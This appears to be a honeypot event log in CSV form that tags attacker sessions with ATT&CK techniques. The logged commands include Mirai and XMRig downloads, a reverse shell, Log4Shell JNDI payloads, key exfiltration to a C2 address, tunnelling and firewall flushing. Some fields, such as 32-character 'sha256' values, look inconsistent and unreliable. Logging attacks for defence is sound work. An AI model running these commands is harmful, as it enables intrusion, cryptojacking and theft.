event_id,session_id,timestamp,event_type,honeypot_id,src_ip,src_port,dst_ip,dst_port,protocol,username,password,login_success,command,command_index,country,asn,isp,attack_type,mitre_technique_id,mitre_technique_name,severity,file_downloaded,c2_ip,sha256_payload,session_duration_sec,bytes_sent,bytes_received,alert_tag,false_positive,thehive_case_id,misp_event_uuid,analyst_note
EVT-003426,21B2CE54,2025-01-02T14:43:59Z,command_executed,hp-eu-01,103.124.104.50,54656,10.0.1.10,22,ssh,www-data,welcome1,True,rm -f /tmp/victim.key /tmp/victim.pub,14,CN,AS45090,Tencent Cloud,Ransomware Staging,T1059,Command and Scripting Interpreter,low,,,,431,171,207,ransomware_staging,False,,70eb58b4-5246-44f4-bbe4-2e8044de8ee8,
EVT-003418,21B2CE54,2025-01-02T14:44:51Z,command_executed,hp-eu-01,103.124.104.50,41206,10.0.1.10,22,ssh,www-data,welcome1,True,df -h | grep -v tmpfs,6,CN,AS45090,Tencent Cloud,Ransomware Staging,T1082,System Information Discovery,low,,,,431,250,345,ransomware_staging,False,,5ccc99c6-2c43-42ac-9c61-ff59d12f978c,
EVT-003427,21B2CE54,2025-01-02T14:46:24Z,command_executed,hp-eu-01,103.124.104.50,52737,10.0.1.10,22,ssh,www-data,welcome1,True,history -c,15,CN,AS45090,Tencent Cloud,Ransomware Staging,T1070.003,Clear Command History,low,,,,431,146,116,ransomware_staging,False,,940f159b-8f38-458d-903c-e7239b8a40ee,
EVT-003422,21B2CE54,2025-01-02T14:46:29Z,command_executed,hp-eu-01,103.124.104.50,50139,10.0.1.10,22,ssh,www-data,welcome1,True,openssl rsa -in /tmp/victim.key -pubout -out /tmp/victim.pub 2>/dev/null,10,CN,AS45090,Tencent Cloud,Ransomware Staging,T1059,Command and Scripting Interpreter,low,,,,431,451,141,ransomware_staging,False,,821613db-366d-4317-9e21-594db6661467,
EVT-003420,21B2CE54,2025-01-02T14:46:35Z,command_executed,hp-eu-01,103.124.104.50,39192,10.0.1.10,22,ssh,www-data,welcome1,True,chmod +x /tmp/.locker,8,CN,AS45090,Tencent Cloud,Ransomware Staging,T1486,Data Encrypted for Impact,critical,,,,431,328,144,ransomware_staging,True,,d99f90cf-c85d-4355-9afb-676f8be054b2,
EVT-003425,21B2CE54,2025-01-02T14:48:22Z,command_executed,hp-eu-01,103.124.104.50,37395,10.0.1.10,22,ssh,www-data,welcome1,True,cat /tmp/README_DECRYPT.txt,13,CN,AS45090,Tencent Cloud,Ransomware Staging,T1059,Command and Scripting Interpreter,low,,,,431,517,390,ransomware_staging,False,,39898fc1-b5a4-4964-9b66-a014bf2d64b8,
EVT-003424,21B2CE54,2025-01-02T14:49:03Z,command_executed,hp-eu-01,103.124.104.50,48101,10.0.1.10,22,ssh,www-data,welcome1,True,/tmp/.locker --target /home --ext .l0ck3d --note /tmp/README_DECRYPT.txt --dry-run,12,CN,AS45090,Tencent Cloud,Ransomware Staging,T1486,Data Encrypted for Impact,critical,,,,431,567,399,ransomware_staging,False,,1639477c-24cc-4801-85f6-1b4fb83cc2af,
EVT-003423,21B2CE54,2025-01-02T14:49:32Z,command_executed,hp-eu-01,103.124.104.50,47233,10.0.1.10,22,ssh,www-data,welcome1,True,curl -X POST http://45.142.212.100:443/keys -d @/tmp/victim.pub,11,CN,AS45090,Tencent Cloud,Ransomware Staging,T1041,Exfiltration Over C2,critical,,45.142.212.100,,431,223,458,ransomware_staging,False,,090e1aa2-6cf7-49f2-8738-d3ed9851c770,
EVT-002637,8FA3DD3D,2025-01-02T16:13:23Z,login_attempt,hp-eu-02,45.142.212.100,37303,10.0.1.11,22,ssh,git,Sup3rS3cr3t!,False,,0,RU,AS197695,Reg.ru,Log4Shell/WebExploit,T1110,Brute Force,medium,,,,274,215,852,brute_force,False,,,
EVT-001196,8430339B,2025-01-02T17:39:23Z,login_attempt,hp-eu-01,178.128.83.165,52857,10.0.1.10,22,ssh,support,Admin@2023,True,,0,SG,AS14061,DigitalOcean SG,Botnet/DDoS,T1110,Brute Force,high,,,,438,465,686,compromised_login,False,,5b25ec82-0331-4939-ab52-fc2dd51c75d8,
EVT-001199,8430339B,2025-01-02T17:39:41Z,command_executed,hp-eu-01,178.128.83.165,46817,10.0.1.10,22,ssh,support,Admin@2023,True,cat /proc/version,3,SG,AS14061,DigitalOcean SG,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,438,276,282,botnet_ddos,False,,b5e8ea35-df4b-4d96-84a8-49f15d48a2f1,
EVT-001197,8430339B,2025-01-02T17:40:00Z,command_executed,hp-eu-01,178.128.83.165,35351,10.0.1.10,22,ssh,support,Admin@2023,True,uname -a,1,SG,AS14061,DigitalOcean SG,Botnet/DDoS,T1082,System Information Discovery,low,,,,438,95,304,botnet_ddos,False,,85def83b-550f-4cc1-a8e1-654982a9d54a,
EVT-001203,8430339B,2025-01-02T17:40:05Z,command_executed,hp-eu-01,178.128.83.165,51257,10.0.1.10,22,ssh,support,Admin@2023,True,wget -q http://194.165.16.11/bins/mirai.x86 -O /tmp/mirai && chmod 777 /tmp/mirai,7,SG,AS14061,DigitalOcean SG,Botnet/DDoS,T1105,Ingress Tool Transfer,medium,yes,194.165.16.11,25c513002cd64095bf2974398758b781,438,583,229,botnet_ddos,False,,59a53df7-fc42-4c85-baba-e8516576295d,
EVT-001198,8430339B,2025-01-02T17:40:13Z,command_executed,hp-eu-01,178.128.83.165,52803,10.0.1.10,22,ssh,support,Admin@2023,True,arch,2,SG,AS14061,DigitalOcean SG,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,438,424,389,botnet_ddos,False,,8149bdfe-a99b-4658-8ec5-23474621be2b,
EVT-001200,8430339B,2025-01-02T17:40:35Z,command_executed,hp-eu-01,178.128.83.165,41560,10.0.1.10,22,ssh,support,Admin@2023,True,ls /tmp /var/tmp /dev/shm 2>/dev/null,4,SG,AS14061,DigitalOcean SG,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,438,226,143,botnet_ddos,False,,67728bc6-3669-44a0-bfc7-597669e66095,
EVT-001201,8430339B,2025-01-02T17:42:28Z,command_executed,hp-eu-01,178.128.83.165,45949,10.0.1.10,22,ssh,support,Admin@2023,True,df -h / | tail -1 | awk '{print $4}',5,SG,AS14061,DigitalOcean SG,Botnet/DDoS,T1082,System Information Discovery,low,,,,438,136,479,botnet_ddos,False,,0ec0f38b-5c7e-4047-8ab2-efbfd2b7b2bd,
EVT-001202,8430339B,2025-01-02T17:42:35Z,command_executed,hp-eu-01,178.128.83.165,49268,10.0.1.10,22,ssh,support,Admin@2023,True,wget -q http://194.165.16.11/bins/mirai.arm -O /tmp/mirai && chmod 777 /tmp/mirai,6,SG,AS14061,DigitalOcean SG,Botnet/DDoS,T1105,Ingress Tool Transfer,medium,yes,194.165.16.11,8a70b970a20f4c2b9252ab62c18d1f21,438,142,213,botnet_ddos,False,,740b0a60-51fa-411b-a315-86dd0bd41853,
EVT-001209,8430339B,2025-01-02T17:42:51Z,command_executed,hp-eu-01,178.128.83.165,50428,10.0.1.10,22,ssh,support,Admin@2023,True,echo '*/5 * * * * /tmp/mirai' | crontab -,13,SG,AS14061,DigitalOcean SG,Botnet/DDoS,T1053.003,Scheduled Task: Cron,low,,,,438,521,150,botnet_ddos,False,,d148023c-7e14-4a29-87e4-16b5d474513c,
EVT-001212,8430339B,2025-01-02T17:42:51Z,command_executed,hp-eu-01,178.128.83.165,55870,10.0.1.10,22,ssh,support,Admin@2023,True,history -c,16,SG,AS14061,DigitalOcean SG,Botnet/DDoS,T1070.003,Clear Command History,low,,,,438,460,439,botnet_ddos,False,,3062563e-f48a-4cfc-98bc-1ae57e76d16e,
EVT-001205,8430339B,2025-01-02T17:42:59Z,command_executed,hp-eu-01,178.128.83.165,59197,10.0.1.10,22,ssh,support,Admin@2023,True,cd /tmp && /tmp/mirai &,9,SG,AS14061,DigitalOcean SG,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,438,470,327,botnet_ddos,False,,d003acbd-8e12-49c8-b601-acda5b5f11fa,
EVT-001208,8430339B,2025-01-02T17:43:47Z,command_executed,hp-eu-01,178.128.83.165,41049,10.0.1.10,22,ssh,support,Admin@2023,True,iptables -F,12,SG,AS14061,DigitalOcean SG,Botnet/DDoS,T1562.004,Disable Firewall,low,,,,438,200,189,botnet_ddos,False,,ceab175e-5dec-4f41-8603-2107f529be8e,
EVT-001204,8430339B,2025-01-02T17:45:15Z,command_executed,hp-eu-01,178.128.83.165,35738,10.0.1.10,22,ssh,support,Admin@2023,True,wget -q http://194.165.16.11/bins/mirai.mips -O /tmp/mirai && chmod 777 /tmp/mirai,8,SG,AS14061,DigitalOcean SG,Botnet/DDoS,T1105,Ingress Tool Transfer,medium,yes,194.165.16.11,1d2095fff1ed4ad989d5c7e18424c5ea,438,250,242,botnet_ddos,False,,0f8a9ba3-26b1-4ab6-a168-065ff1e29262,
EVT-001207,8430339B,2025-01-02T17:45:15Z,command_executed,hp-eu-01,178.128.83.165,51080,10.0.1.10,22,ssh,support,Admin@2023,True,iptables -A OUTPUT -j ACCEPT,11,SG,AS14061,DigitalOcean SG,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,438,246,78,botnet_ddos,False,,945a6e0e-1e29-49f5-b903-7f8c56e93091,
EVT-001206,8430339B,2025-01-02T17:46:33Z,command_executed,hp-eu-01,178.128.83.165,55755,10.0.1.10,22,ssh,support,Admin@2023,True,iptables -A INPUT -j ACCEPT,10,SG,AS14061,DigitalOcean SG,Botnet/DDoS,T1562.004,Disable Firewall,low,,,,438,335,101,botnet_ddos,False,,ff3a72f8-d0ce-4d20-bf9c-e6f586d98a19,
EVT-001211,8430339B,2025-01-02T17:46:53Z,command_executed,hp-eu-01,178.128.83.165,39156,10.0.1.10,22,ssh,support,Admin@2023,True,rm -f /tmp/mirai.arm /tmp/mirai.x86 /tmp/mirai.mips,15,SG,AS14061,DigitalOcean SG,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,438,388,383,botnet_ddos,False,,5aa515ac-0b7f-47be-90e7-3ff8a1994769,
EVT-001210,8430339B,2025-01-02T17:49:39Z,command_executed,hp-eu-01,178.128.83.165,43022,10.0.1.10,22,ssh,support,Admin@2023,True,curl -sk http://194.165.16.11/report?h=$(hostname -s)&ip=$(curl -s ifconfig.me 2>/dev/null)&arch=$(arch),14,SG,AS14061,DigitalOcean SG,Botnet/DDoS,T1082,System Information Discovery,medium,yes,194.165.16.11,b44791aada5749699cbadbbc051f5e87,438,584,254,botnet_ddos,False,,9f753d34-23cc-4eab-8732-4dbab2d92b52,
EVT-002412,172E0832,2025-01-02T19:15:25Z,login_attempt,hp-eu-02,222.187.232.205,40355,10.0.1.11,23,telnet,root,123456789,False,,0,CN,AS4134,ChinaNet,Rootkit/Persistence,T1110,Brute Force,medium,,,,347,463,2273,brute_force,False,,,
EVT-000476,3E435DE1,2025-01-03T20:23:19Z,login_attempt,hp-eu-02,46.101.90.205,56703,10.0.1.11,2222,ssh,root,root,False,,0,DE,AS14061,DigitalOcean DE,Supply Chain Abuse,T1110,Brute Force,medium,,,,451,867,2435,brute_force,False,,,
EVT-000877,A3283816,2025-01-03T23:43:36Z,login_attempt,hp-eu-02,188.166.23.127,45515,10.0.1.11,23,telnet,postgres,xmhdipc,False,,0,NL,AS14061,DigitalOcean AMS,Redis Exploitation,T1110,Brute Force,medium,,,,68,837,1371,brute_force,False,,,
EVT-002974,DA42A913,2025-01-04T16:33:44Z,login_attempt,hp-ap-01,188.166.23.127,57212,10.0.3.10,23,telnet,grafana,jvbzd,False,,0,NL,AS14061,DigitalOcean AMS,Network Reconnaissance,T1110,Brute Force,medium,,,,517,304,1902,brute_force,False,,,
EVT-002414,78A1C8DE,2025-01-04T20:47:56Z,login_attempt,hp-eu-02,185.129.62.62,41614,10.0.1.11,22,ssh,centos,admin,True,,0,DK,AS29791,Zayo,Log4Shell/WebExploit,T1110,Brute Force,high,,,,74,289,1655,compromised_login,False,,1573d513-99ec-4281-89ba-f3d23b08e157,
EVT-002415,78A1C8DE,2025-01-04T20:48:27Z,command_executed,hp-eu-02,185.129.62.62,38744,10.0.1.11,22,ssh,centos,admin,True,id && uname -a,1,DK,AS29791,Zayo,Log4Shell/WebExploit,T1082,System Information Discovery,low,,,,74,493,256,log4shell_webexploit,False,,719913c3-fcc6-49e8-899f-5e4d51cadfab,
EVT-002420,78A1C8DE,2025-01-04T20:48:38Z,command_executed,hp-eu-02,185.129.62.62,46528,10.0.1.11,22,ssh,centos,admin,True,find / -name 'log4j*.jar' -o -name '*log4j*' 2>/dev/null | head -10,6,DK,AS29791,Zayo,Log4Shell/WebExploit,T1190,Exploit Public-Facing Application,high,,,,74,99,410,log4shell_webexploit,False,,5a166cca-9ba6-4fb7-ae2e-8ece53436eb9,
EVT-002417,78A1C8DE,2025-01-04T20:49:11Z,command_executed,hp-eu-02,185.129.62.62,39741,10.0.1.11,22,ssh,centos,admin,True,curl -sk http://localhost/actuator/env 2>/dev/null | python3 -m json.tool | head -50,3,DK,AS29791,Zayo,Log4Shell/WebExploit,T1059,Command and Scripting Interpreter,medium,yes,,2a343699cd7b4ac58b2e7afb93a6dc8d,74,440,130,log4shell_webexploit,False,,41e95a5c-6c9c-4f61-98be-fb730611293f,
EVT-002416,78A1C8DE,2025-01-04T20:49:22Z,command_executed,hp-eu-02,185.129.62.62,50925,10.0.1.11,22,ssh,centos,admin,True,cat /proc/net/tcp | head,2,DK,AS29791,Zayo,Log4Shell/WebExploit,T1059,Command and Scripting Interpreter,low,,,,74,428,389,log4shell_webexploit,False,,5bdf26d9-12fc-4a2d-a333-adad96caf55a,
EVT-002424,78A1C8DE,2025-01-04T20:49:36Z,command_executed,hp-eu-02,185.129.62.62,48444,10.0.1.11,22,ssh,centos,admin,True,wget -q http://185.220.101.47/tools/chisel_linux -O /tmp/.chisel && chmod +x /tmp/.chisel,10,DK,AS29791,Zayo,Log4Shell/WebExploit,T1105,Ingress Tool Transfer,critical,yes,185.220.101.47,4c6eb230b37445ffb27f386c488b4920,74,527,416,log4shell_webexploit,False,,7adbf9f3-797a-44e2-b457-6e111cc8f405,
EVT-002418,78A1C8DE,2025-01-04T20:50:52Z,command_executed,hp-eu-02,185.129.62.62,50024,10.0.1.11,22,ssh,centos,admin,True,curl -sk http://localhost/actuator/heapdump -o /tmp/.heap.bin 2>/dev/null,4,DK,AS29791,Zayo,Log4Shell/WebExploit,T1059,Command and Scripting Interpreter,medium,yes,,9da63b8fadcd4ef2ad80f2ac36d18a31,74,483,127,log4shell_webexploit,False,,51024de9-c23b-40aa-8e9a-6f0a0bafc21a,
EVT-002423,78A1C8DE,2025-01-04T20:50:56Z,command_executed,hp-eu-02,185.129.62.62,46422,10.0.1.11,22,ssh,centos,admin,True,java -jar /tmp/JNDI-Exploit.jar -C 'bash -i >& /dev/tcp/185.220.101.47/4444 0>&1' -A 185.220.101.47 2>/dev/null &,9,DK,AS29791,Zayo,Log4Shell/WebExploit,T1059.004,Unix Shell,low,,185.220.101.47,,74,237,284,log4shell_webexploit,False,,2e7fbe2f-f826-419e-b6ac-cf37eab801d8,
EVT-002419,78A1C8DE,2025-01-04T20:51:26Z,command_executed,hp-eu-02,185.129.62.62,39253,10.0.1.11,22,ssh,centos,admin,True,strings /tmp/.heap.bin | grep -iE 'password|secret|key|token|credential' | head -30,5,DK,AS29791,Zayo,Log4Shell/WebExploit,T1552,Unsecured Credentials,low,,,,74,502,425,log4shell_webexploit,False,,c26b85c6-c676-46ba-9f0f-8f31b22c2689,
EVT-002427,78A1C8DE,2025-01-04T20:51:37Z,command_executed,hp-eu-02,185.129.62.62,42525,10.0.1.11,22,ssh,centos,admin,True,history -c,13,DK,AS29791,Zayo,Log4Shell/WebExploit,T1070.003,Clear Command History,low,,,,74,180,199,log4shell_webexploit,False,,de034598-21d4-4195-b0e8-18ff58e6e62e,
EVT-002426,78A1C8DE,2025-01-04T20:52:20Z,command_executed,hp-eu-02,185.129.62.62,43836,10.0.1.11,22,ssh,centos,admin,True,rm -f /tmp/.heap.bin /tmp/JNDI-Exploit.jar,12,DK,AS29791,Zayo,Log4Shell/WebExploit,T1059,Command and Scripting Interpreter,low,,,,74,173,48,log4shell_webexploit,False,,687a2e7f-fbf8-4c1f-b49b-dbcb35b2a8bd,
EVT-002422,78A1C8DE,2025-01-04T20:52:36Z,command_executed,hp-eu-02,185.129.62.62,60931,10.0.1.11,22,ssh,centos,admin,True,curl -sk 'http://localhost:8080/login' -d 'username=${jndi:ldap://185.220.101.47:1389/a}&password=x',8,DK,AS29791,Zayo,Log4Shell/WebExploit,T1190,Exploit Public-Facing Application,critical,,185.220.101.47,,74,402,234,log4shell_webexploit,False,,f36eaa57-1914-4779-8aa1-c550e469fcb6,
EVT-002421,78A1C8DE,2025-01-04T20:53:04Z,command_executed,hp-eu-02,185.129.62.62,43896,10.0.1.11,22,ssh,centos,admin,True,curl -sk 'http://localhost:8080/' -H 'X-Api-Version: ${jndi:ldap://185.220.101.47:1389/a}',7,DK,AS29791,Zayo,Log4Shell/WebExploit,T1190,Exploit Public-Facing Application,critical,,185.220.101.47,,74,284,101,log4shell_webexploit,False,,3e1d6f8d-07b1-403e-b605-a8532eb58078,
EVT-002425,78A1C8DE,2025-01-04T20:54:43Z,command_executed,hp-eu-02,185.129.62.62,40188,10.0.1.11,22,ssh,centos,admin,True,/tmp/.chisel client 185.220.101.47:8888 R:socks 2>/dev/null &,11,DK,AS29791,Zayo,Log4Shell/WebExploit,T1572,Protocol Tunneling,critical,,185.220.101.47,,74,490,60,log4shell_webexploit,False,,44532bac-a035-493a-a2aa-b5fdac1bbbdd,
EVT-000803,F8A536F3,2025-01-04T22:51:22Z,login_attempt,hp-us-01,198.199.119.50,44470,10.0.2.10,22,ssh,grafana,Autumn2023#,True,,0,US,AS14061,DigitalOcean,Cryptomining,T1110,Brute Force,high,,,,345,720,1813,compromised_login,False,,14f9e8e2-267f-4096-bafb-8c05f80da43e,
EVT-000804,F8A536F3,2025-01-04T22:52:05Z,command_executed,hp-us-01,198.199.119.50,54236,10.0.2.10,22,ssh,grafana,Autumn2023#,True,uname -a,1,US,AS14061,DigitalOcean,Cryptomining,T1082,System Information Discovery,low,,,,345,204,196,cryptomining,False,,0c553d01-3f0d-4133-b9da-5b356cdecc73,
EVT-000805,F8A536F3,2025-01-04T22:52:40Z,command_executed,hp-us-01,198.199.119.50,37636,10.0.2.10,22,ssh,grafana,Autumn2023#,True,cat /proc/cpuinfo | grep -c processor,2,US,AS14061,DigitalOcean,Cryptomining,T1082,System Information Discovery,low,,,,345,428,64,cryptomining,False,,13834a5c-97cc-46e5-8463-36c1eeea8339,
EVT-000812,F8A536F3,2025-01-04T22:52:43Z,command_executed,hp-us-01,198.199.119.50,52191,10.0.2.10,22,ssh,grafana,Autumn2023#,True,cd /tmp && curl -fsSL http://45.142.212.100/xmr/setup.sh -o .setup.sh,9,US,AS14061,DigitalOcean,Cryptomining,T1105,Ingress Tool Transfer,medium,yes,45.142.212.100,4a6da2b50a504111bd2cf4626dd644a9,345,507,420,cryptomining,False,,95fcf0c9-ce37-4a36-b2cb-48b6fd2729ee,
EVT-000814,F8A536F3,2025-01-04T22:52:50Z,command_executed,hp-us-01,198.199.119.50,60851,10.0.2.10,22,ssh,grafana,Autumn2023#,True,wget -q http://45.142.212.100/xmr/xmrig -O /tmp/.xmrig64,11,US,AS14061,DigitalOcean,Cryptomining,T1105,Ingress Tool Transfer,medium,yes,45.142.212.100,2750b329ede44f7baa5de777f24a88c3,345,271,292,cryptomining,False,,a8f5b30b-7a81-4b62-88aa-af7f3b25ec7d,
EVT-000806,F8A536F3,2025-01-04T22:53:31Z,command_executed,hp-us-01,198.199.119.50,43384,10.0.2.10,22,ssh,grafana,Autumn2023#,True,cat /proc/meminfo | grep MemTotal,3,US,AS14061,DigitalOcean,Cryptomining,T1082,System Information Discovery,low,,,,345,108,77,cryptomining,False,,b499af7e-9aee-47fd-9345-1b71269cfcd8,
EVT-000813,F8A536F3,2025-01-04T22:53:32Z,command_executed,hp-us-01,198.199.119.50,42100,10.0.2.10,22,ssh,grafana,Autumn2023#,True,chmod +x .setup.sh && bash .setup.sh 2>/dev/null,10,US,AS14061,DigitalOcean,Cryptomining,T1059,Command and Scripting Interpreter,low,,,,345,389,76,cryptomining,False,,f2c2a186-c212-4d98-bd9f-5000e2270290,
EVT-000809,F8A536F3,2025-01-04T22:53:40Z,command_executed,hp-us-01,198.199.119.50,43836,10.0.2.10,22,ssh,grafana,Autumn2023#,True,id && whoami,6,US,AS14061,DigitalOcean,Cryptomining,T1033,System Owner/User Discovery,low,,,,345,344,139,cryptomining,False,,1a5ec5f5-cec7-48ad-a569-b6e82a549167,
EVT-000807,F8A536F3,2025-01-04T22:54:22Z,command_executed,hp-us-01,198.199.119.50,59360,10.0.2.10,22,ssh,grafana,Autumn2023#,True,free -m,4,US,AS14061,DigitalOcean,Cryptomining,T1059,Command and Scripting Interpreter,low,,,,345,359,128,cryptomining,False,,96b90109-37bc-42e1-9ace-966f7d2fb509,
EVT-000811,F8A536F3,2025-01-04T22:54:58Z,command_executed,hp-us-01,198.199.119.50,57635,10.0.2.10,22,ssh,grafana,Autumn2023#,True,pkill -f xmrig; pkill -f kswapd0; pkill -f pastebin,8,US,AS14061,DigitalOcean,Cryptomining,T1489,Service Stop,low,,,,345,360,231,cryptomining,True,,9ab122d7-75ec-4293-b81a-1b98b162ad62,
EVT-000808,F8A536F3,2025-01-04T22:55:02Z,command_executed,hp-us-01,198.199.119.50,60269,10.0.2.10,22,ssh,grafana,Autumn2023#,True,df -h,5,US,AS14061,DigitalOcean,Cryptomining,T1082,System Information Discovery,low,,,,345,449,278,cryptomining,False,,fd52eac4-257f-40d0-972a-29919ee7059f,
EVT-000810,F8A536F3,2025-01-04T22:55:13Z,command_executed,hp-us-01,198.199.119.50,41532,10.0.2.10,22,ssh,grafana,Autumn2023#,True,ps aux | grep -E 'miner|xmrig|kswapd|pastebin',7,US,AS14061,DigitalOcean,Cryptomining,T1057,Process Discovery,low,,,,345,523,430,cryptomining,False,,95b114eb-25f3-4c7f-90e6-946b2ccfe082,
EVT-000816,F8A536F3,2025-01-04T22:55:42Z,command_executed,hp-us-01,198.199.119.50,60852,10.0.2.10,22,ssh,grafana,Autumn2023#,True,nohup /tmp/.xmrig64 --donate-level 1 -o pool.minexmr.com:4444 -u 44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A -p x -B 2>/dev/null &,13,US,AS14061,DigitalOcean,Cryptomining,T1496,Resource Hijacking,critical,,,,345,338,245,cryptomining,False,,53fdd08a-566d-4b6e-b08e-b330e697c29c,
EVT-000819,F8A536F3,2025-01-04T22:55:54Z,command_executed,hp-us-01,198.199.119.50,60721,10.0.2.10,22,ssh,grafana,Autumn2023#,True,history -c && echo > ~/.bash_history,16,US,AS14061,DigitalOcean,Cryptomining,T1070.003,Clear Command History,low,,,,345,399,174,cryptomining,False,,21c81808-4825-473a-9e06-b4b2550a80d9,
EVT-000815,F8A536F3,2025-01-04T22:56:22Z,command_executed,hp-us-01,198.199.119.50,42294,10.0.2.10,22,ssh,grafana,Autumn2023#,True,chmod +x /tmp/.xmrig64,12,US,AS14061,DigitalOcean,Cryptomining,T1496,Resource Hijacking,critical,,,,345,470,459,cryptomining,False,,bff14299-6e17-44ca-8b3d-69733433d822,
